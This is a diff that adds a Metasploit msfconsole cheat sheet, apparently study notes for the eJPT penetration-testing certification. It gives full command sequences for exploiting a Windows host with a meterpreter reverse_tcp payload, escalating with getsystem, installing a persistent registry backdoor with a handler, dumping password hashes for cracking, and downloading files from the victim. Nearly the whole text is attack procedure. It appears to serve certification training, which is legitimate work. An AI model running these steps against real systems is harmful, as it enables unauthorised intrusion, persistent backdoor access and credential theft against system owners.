@@ -1,0 +1,60 @@
+[eJPT][metasploit][msfconsole]Metasploit Msfconsole Gameplay
+
+
+#################################################Basic Gameplay
+#/etc/init.d/postgresql start
+#msfconsole
+>search type:exploit platform:windows               <--Find the appropriate exploit
+>use XX
+>show options
+...
+>set XXX XXX
+...
+>show payloads
+>set payload windows/meterpreter/reverse_tcp        <--Select a payload
+>set LHOST XXX.XXX.XXX.XXX
+>set EXITFUNC process
+>run                                                <--Exploit
+...
+meterpreter>getuid
+meterpreter>getsystem                               <--Privilege Escalation
+meterpreter>getuid
+meterpreter>background
+>sessions -l
+...
+
+
+
+#################################################Install Persistent Backdoor
+>use exploit/windows/local/persistence
+>show options
+...
+>set reg_name XXX
+>set exe_name XXX
+>set startup SYSTEM
+>set session 1
+>set payload windows/meterpreter/reverse_tcp
+>set exitfunc process
+>set lhost XXX.XXX.XXX.XXX
+>set lport XXXX
+>set DisablePayloadHandler false
+>exploit                                           <--Install a backdoor. Use exploit -j instead if not working.
+...
+>use exploit/multi/handler
+>set lhost XXX.XXX.XXX.XXX
+>set lport XXXX
+>set payload windows/meterpreter/reverse_tcp
+>exploit -j                                       <--Launch the backdoor client, namely Handler
+
+
+
+#################################################Crack Passwords
+>sessions -l
+>sessions -i 1
+meterpreter>hashdump                              <--Dump the hashes of all accounts as the output. Save the output as a file and use John to crack it.
+
+
+
+#################################################Search and Download Files
+meterpreter>search -f congrats.txt
+meterpreter>download 'c:\Documents and Settings\eLSAdmin\My Documents\Congrats.txt' /root/
